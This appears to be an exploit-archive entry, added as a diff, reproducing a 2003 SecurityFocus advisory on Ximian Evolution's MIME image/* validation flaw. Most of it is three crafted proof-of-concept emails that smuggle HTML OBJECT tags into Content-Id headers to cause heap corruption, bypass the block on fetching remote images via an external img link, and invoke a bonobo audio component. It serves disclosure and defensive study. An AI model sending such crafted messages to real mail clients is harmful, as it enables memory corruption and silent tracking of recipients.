@@ -1,0 +1,87 @@
+source: http://www.securityfocus.com/bid/7119/info
+
+Ximian Evolution does not properly validate MIME image/* Content-Type fields. If an email message contains an image/* Content-Type, any type of data can be embedded where the image information is expected. This can be used to embed HTML tags that will be rendered by GTKHtml, bypass policies, or invoke bonobo components to handle external content types.
+
+The following example will cause heap corruption:
+
+>From xxx@corest.com Wed Mar 5 14:06:02 2003
+Subject: xxx
+From: X X. X <xxx@corest.com>
+To: xxx@corest.com
+Content-Type: multipart/mixed; boundary="=-mTDu5zdJIsixETTwCF5Y"
+Message-Id: <1046884154.1731.5.camel@vaiolin>
+Mime-Version: 1.0
+Date: 05 Mar 2003 14:09:14 -0300
+
+--=-mTDu5zdJIsixETTwCF5Y
+Content-Type: text/plain
+Content-Transfer-Encoding: 7bit
+Content-Id: hello
+
+Hello World!
+
+--=-mTDu5zdJIsixETTwCF5Y
+Content-Disposition: attachment; filename=name1.gif
+Content-Type: image/gif; name=name1.gif
+Content-Id: "><OBJECT classid="cid:hello" type="text/plain"></OBJECT><hr "
+Content-Transfer-Encoding: base64
+
+--=-mTDu5zdJIsixETTwCF5Y
+Content-Disposition: attachment; filename=name2.gif
+Content-Type: image/gif; name=name2.gif
+Content-Id: "><OBJECT classid="cid:hello" type="text/plain"></OBJECT><hr "
+Content-Transfer-Encoding: base64
+
+--=-mTDu5zdJIsixETTwCF5Y
+
+The following example will bypass the "Don't connect to remote hosts to fetch images" option:
+
+>From xxx@corest.com Wed Mar 5 14:06:02 2003
+Subject: xxx
+From: X X. X <xxx@corest.com>
+To: xxx@corest.com
+Content-Type: multipart/mixed; boundary="=-mTDu5zdJIsixETTwCF5Y"
+Message-Id: <1046884154.1731.5.camel@vaiolin>
+Mime-Version: 1.0
+Date: 05 Mar 2003 14:09:14 -0300
+
+--=-mTDu5zdJIsixETTwCF5Y
+Content-Type: text/html
+Content-Transfer-Encoding: 7bit
+Content-Id: apart
+
+<img src="http://external.host.com:anyport">
+
+--=-mTDu5zdJIsixETTwCF5Y
+Content-Disposition: attachment; filename=name2.gif
+Content-Type: image/gif; name=name2.gif
+Content-Id: "><OBJECT classid="cid:apart" type="text/html"></OBJECT><hr "
+Content-Transfer-Encoding: base64
+
+--=-mTDu5zdJIsixETTwCF5Y
+
+The following example will cause Evolution to invoke the bonobo-audio-ulaw component:
+
+>From xxx@corest.com Wed Mar 5 14:06:02 2003
+Subject: xxx
+From: X X. X <xxx@corest.com>
+To: xxx@corest.com
+Content-Type: multipart/mixed; boundary="=-mTDu5zdJIsixETTwCF5Y"
+Message-Id: <1046884154.1731.5.camel@vaiolin>
+Mime-Version: 1.0
+Date: 05 Mar 2003 14:09:14 -0300
+
+--=-mTDu5zdJIsixETTwCF5Y
+Content-Type: audio/ulaw
+Content-Transfer-Encoding: 7bit
+Content-Id: mysong
+
+There she was, just walking down the street...
+
+--=-mTDu5zdJIsixETTwCF5Y
+Content-Disposition: attachment; filename=name2.gif
+Content-Type: image/gif; name=name2.gif
+Content-Id: "><OBJECT classid="cid:mysong" type="audio/ulaw"></OBJECT><hr "
+Content-Transfer-Encoding: base64
+
+--=-mTDu5zdJIsixETTwCF5Y
